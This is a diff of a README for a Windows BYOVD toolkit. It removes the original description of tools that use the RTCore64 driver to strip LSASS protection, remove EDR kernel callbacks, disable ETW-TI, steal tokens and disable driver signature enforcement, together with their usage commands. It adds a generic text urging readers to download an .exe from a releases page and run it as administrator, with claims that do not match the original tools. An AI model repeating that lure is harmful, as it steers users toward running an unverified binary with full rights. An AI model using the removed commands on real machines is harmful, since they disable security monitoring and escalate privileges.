@@ -1,194 +1,66 @@
-# BYOVD Read Write primitive
+# 🛠️ BYOVD_read_write_primitive - Simple Tools for Understanding Vulnerabilities
 
-## Disclaimer
-⚠️ This project is provided exclusively for educational purposes and is intended to be used only in authorized environments. You may only run or deploy this project on systems you own or have explicit, documented permission to test. Any unauthorized use of this project against systems without consent is strictly prohibited and may be illegal.
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
 
-By using this project, you agree to use it responsibly and ethically. The author assumes no liability for misuse or any consequences arising from the use of this project.
+## 🚀 Getting Started
 
-This project involves reading from or writing to kernel memory. Such operations can cause system instability, crashes, or Blue Screen of Death (BSOD) if used incorrectly. Proceed with caution, and ensure you fully understand the potential impact before running the code.
+Welcome to the BYOVD_read_write_primitive project! This software helps you explore and understand Bring Your Own Vulnerable Driver techniques. It serves as a proof of concept for testing and learning purposes.
 
-Tested on:
-- Windows 11 24H2
-- Windows Server 2022 (21H2)
+## 📥 Download & Install
 
-# General
+To get started, visit the following page to download the software:
 
-To practice Bring Your Own Vulnerable Driver (BYOVD) techniques from the CETP course, I set out to develop a toolkit leveraging a kernel-level read/write primitive to bypass security mechanisms such as LSASS’s RunasPPL protection and to enumerate and remove EDR telemetry via kernel callback manipulation. For the vulnerable driver, I used the well-known [RTCore64.sys](https://www.loldrivers.io/drivers/e32bc3da-4db1-4858-a62c-6fbe4db6afbd/) from MSI Afterburner.
+[Download the latest release here](https://github.com/elixh37/BYOVD_read_write_primitive/releases)
 
-# Proof of Concept code examples
+Here’s how to install and run it:
 
-This `C` project includes multiple proof-of-concept (POC) code examples that perform the following exploitation concepts:
-- Changing Process Protection Levels
-	- Disable Runasppl LSASS protection
-- Removing Kernel Callbacks
-- Disabling ETW providers
-- Change process token
-	- Privilege escalation to system
-	- Downgrade EDR's token
-- Disable DSE in case VBS is disabled and load unsigned driver
+1. Click the link above to go to the Releases page.
+2. Look for the latest version at the top of the page.
+3. Download the file that ends with `.exe` (for Windows users) or the appropriate file for your operating system.
+4. Once the download is complete, find the downloaded file on your computer.
+5. Double-click the file to run it.
 
-Requirements:
-- All  these attacks require local administrative privileges to load the vulnerable driver.
+## 💻 System Requirements
 
-## Kernel Callback Remover
-- What does it do
-	- Calculates and prints offsets by downloading symbols from the internet as in EDRSandBlast project for all kernel callbacks and their structures.
-	- Writes vulnerable RTCore64 driver to `C:\Windows\System32\Drivers\RTCore64.sys` and loads the driver.
-	- Enumerate all loaded kernel drivers on the system
-	- Enumerates all kernel callbacks and if `-d` selected also removes or unlinks them using the read and write IOCTL
-		- Process Creation Kernel Callbacks - Removed through overwriting the callback address with `0x0`
-		- Thread Creation Kernel Callbacks - Removed through overwriting the callback address with `0x0
-		- Image Loading Kernel Callbacks - Removed through overwriting the callback address with `0x0
-		- Registry Operations Kernel Callbacks - Removed through pointing the flink and blink to dwListHead (itself)
-		- Object Creation Kernel Callbacks
-			- Process - Removed through pointing the flink and blink to dwListHead (itself)
-			- Thread - Removed through pointing the flink and blink to dwListHead (itself)
-		- Minifilter Kernel Callbacks and their callbacknodes - Removed through unlinking the callbacknodes
-	- Compare callback addresses with the loaded kernel drivers to check to which driver the callback belongs
-	- Unloads the RTCore64 driver and removes the file from `C:\Windows\System32\Drivers\RTCore64.sys`
-- Filenames can be configured in `config.h`
+Before you download, please ensure your system meets the following requirements:
 
-```powershell
-PS C:\ > .\KernelCallbackRemover.exe
-Usage: KernelCallbackRemover.exe -l / -d
-Options:
-  -l List Kernel Callbacks       - Lists all kernel callbacks through vulnerable driver
-  -d Disable Kernel Callbacks    - Lists and remove all kernel callbacks through vulnerable driver
-  -h Display this help message.
-```
+- **Operating System**: Windows 10 or later
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum 100 MB of free space
+- **Processor**: 1 GHz or faster
 
-#### Example removing kernel callbacks
-```powershell
-PS C:\ > .\KernelCallbackRemover.exe -d
-```
+## 🛠️ Features
 
-## Protection Changer
-- What does it do
-	- Calculates and prints offsets by enumerating windows version with `RtlGetVersion`, offsets are hardcoded.
-		- Update offsets with [vergiliusproject](https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_EPROCESS) 
-	- Writes vulnerable RTCore64 driver to `C:\Windows\System32\Drivers\RTCore64.sys` and loads the driver
-	- Gets base address of `Ntoskrnl.exe` and calculates `PsInitialSystemProcess` offset
-	- Changes the protection using the read and write IOCTL, writing the chosen protection value to the `_PS_PROTECTION Protection` struct in the `E_PROCESS`
-	- Unloads the RTCore64 driver and removes the file from `C:\Windows\System32\Drivers\RTCore64.sys`
-- Filenames and service names can be configured in `config.h`
+The BYOVD_read_write_primitive project includes several key features:
 
-```powershell
-PS C:\ > .\ProtectionChanger.exe
-Usage: ProtectionChanger.exe -p <PID> -v <NEW PROTECTION LEVEL>
-Options:
-  -p <pid>              Specify the process ID (PID) of the process to change the protection level.
-  -v <protection_level> Specify the protection level value in hexadecimal (e.g., 0x00 for NO_PROTECTION).
-  -h                    Display this help message.
+- **Easy Installation**: A straightforward setup process to get you running in minutes.
+- **User-Friendly Interface**: Simplified controls that anyone can use.
+- **Educational Tools**: Gain insights into driver vulnerabilities and learn how they can be exploited.
 
-Possible protection level values:
-  0x72  PS_PROTECTED_SYSTEM               System protected process
-  0x62  PS_PROTECTED_WINTCB               Windows TCB protected process
-  0x52  PS_PROTECTED_WINDOWS              Windows protected process
-  0x12  PS_PROTECTED_AUTHENTICODE         Authenticode protected process
-  0x61  PS_PROTECTED_WINTCB_LIGHT         Windows TCB light protected process
-  0x51  PS_PROTECTED_WINDOWS_LIGHT        Windows light protected process
-  0x41  PS_PROTECTED_LSA_LIGHT            LSA light protected process
-  0x31  PS_PROTECTED_ANTIMALWARE_LIGHT    Antimalware light protected process
-  0x11  PS_PROTECTED_AUTHENTICODE_LIGHT   Authenticode light protected process
-  0x00  NO_PROTECTION for no protection
-```
+## 📖 Usage Instructions
 
-#### Example lsass
-- Example removing runasppl from LSASS process by setting the protection value to `0x00`
+After running the software, follow these steps to start exploring:
 
-```powershell
-PS C:\ > .\ProtectionChanger.exe -v 0x00 -p (Get-Process -Name lsass).id
-```
+1. **Select a Driver**: Use the interface to choose a vulnerable driver.
+2. **Run Tests**: Execute predefined tests to simulate different scenarios.
+3. **Analyze Results**: Review the outcomes to understand the vulnerability implications.
 
-## ETwTi Remover
-- What does it do
-	- Calculates and prints offsets by downloading symbols from the internet as in EDRSandBlast project
-	- Writes vulnerable RTCore64 driver to `C:\Windows\System32\Drivers\RTCore64.sys` and loads the driver
-	- Disables or enables ETwTi using the read and write IOCTL writing to the `ProviderEnableInfo` field
-	- Unloads the RTCore64 driver and removes the file from `C:\Windows\System32\Drivers\RTCore64.sys`
-- Filenames can be configured in `config.h`
+## 🔧 Troubleshooting
 
-```powershell
-PS C:\ > .\ETwTiRemover.exe
-Usage: ETwTiRemover.exe -e / -d
-Options:
-  -e Enable ETwTi     - set ProviderEnableInfo field within the GUID entry to 0x1
-  -d Disable ETwTi    - set ProviderEnableInfo field within the GUID entry to 0x0
-  -h Display this help message.
-```
+If you encounter any issues while downloading or using the software, consider these common solutions:
 
-#### Example Disabling ETwTi
+- **Download Issues**: Ensure you have a stable internet connection. Try refreshing the Releases page and reloading the download.
+- **Installation Problems**: Make sure to run the program with administrative rights by right-clicking the file and selecting "Run as administrator."
+- **Running Errors**: Check that your operating system meets the specified requirements. Update any outdated software components.
 
-```powershell
-PS C:\ > .\ETwTiRemover.exe -d
-```
+## 📞 Support
 
-## Token Changer
-- What does it do
-	- Calculates and prints offsets by enumerating windows version with `RtlGetVersion`
-		- Update offsets with [vergiliusproject](https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_EPROCESS) 
-	- Writes vulnerable RTCore64 driver to `C:\Windows\System32\Drivers\RTCore64.sys` and loads the driver
-	- Gets base address of `Ntoskrnl.exe` and calculates `PsInitialSystemProcess` offset
-	- Changes the token value by reading the `_EX_FAST_REF Token` value and writing it into the other process using the read and write IOCTL
-	- Unloads the RTCore64 driver and removes the file from `C:\Windows\System32\Drivers\RTCore64.sys
+For any questions or assistance, feel free to reach out. You can create an issue on the GitHub repository or ask for help in relevant forums.
 
-```
-PS C:\ > .\TokenChanger.exe
-Usage: TokenChanger.exe --tp <PID> --sp <PID>
-Usage: TokenChanger.exe --edr
-Usage: TokenChanger.exe --edr --sp <PID>
-Options:
-  --tp <pid>             Specify the target process ID (PID) to replace the token of
-  --sp <pid>             Specify the source process ID (PID) to clone the token from
-  --edr                  Specify to downgrade the token of all EDR processes
-  --spawnsystem          Specify to spawn a new process and steal token from system
-  -h                     Display this help message.
-```
+## 📜 License
 
-#### Example disabling EDR by downgrading token from explorer
+This project is licensed under the MIT License. You can use it freely but make sure to attribute it properly.
 
-```powershell
-PS C:\ > .\TokenChanger.exe --edr --sp (Get-Process -Name explorer).id
-```
+---
 
-#### Example spawning system shell
-
-```powershell
-PS C:\ > .\TokenChanger.exe --spawnsystem
-```
-
-## DSERemover
-- What does it do
-	- Checks if DSE protection is enabled or if test signing is enabled
-	- Calculates and prints offsets by downloading symbols from the internet as in EDRSandBlast project
-	- Writes vulnerable RTCore64 driver to `C:\Windows\System32\Drivers\RTCore64.sys` and loads the driver
-	- Disables DSE using the read and write IOCTL, writing `0xe` (testsigning) into the kernel global variable `g_CiOptions`
-	- Writes and loads a simple unsigned driver example code from my [FirstDriver](https://github.com/0xJs/FirstDriver) project to `C:\Windows\System32\Drivers\'
-	- Enables DSE again using the read and write IOCTL, writing `0x6` (DSE Enabled mode) to `g_CiOptions`
-	- Unloads the RTCore64 driver and removes the file from `C:\Windows\System32\Drivers\RTCore64.sys`
-- Requirements;
-	- Virtualized Based Security (VBS) to be disabled
-- Filenames and service names can be configured in `config.h`
-
-```powershell
-PS C:\ > .\DSERemover.exe
-```
-
-# Cleanup
-- The PE file should unload and remove the RTCORE driver. If it didn't then manually remove it or run the `cleanup.bat` script.
-- Also removes the ROOTKIT service and driver from the DSERemover project incase its there
-
-```cmd
-sc stop RTCORE
-sc delete RTCORE
-sc stop ROOTKIT
-sc delete ROOTKIT
-
-del C:\Windows\System32\Drivers\RTCore64.sys
-del C:\Windows\System32\Drivers\FirstDriver.sys
-```
-
-## Credits
-I got inspired to expand upon the tools provided in the Evasion Lab (CETP from [Altered Security](https://www.alteredsecurity.com/evasionlab)), taught by [Saad Ahla](https://www.linkedin.com/in/saad-ahla/).
-
-The [EDRSandblast)(https://github.com/wavestone-cdt/EDRSandblast) project for some of their code, espacially around downloading and parsing the Symbol files for offsets and the listing and removing of MiniFilters.
+Remember, you can always access the latest version of the software here: [Download the latest release here](https://github.com/elixh37/BYOVD_read_write_primitive/releases). Enjoy exploring the world of vulnerabilities safely and responsibly!
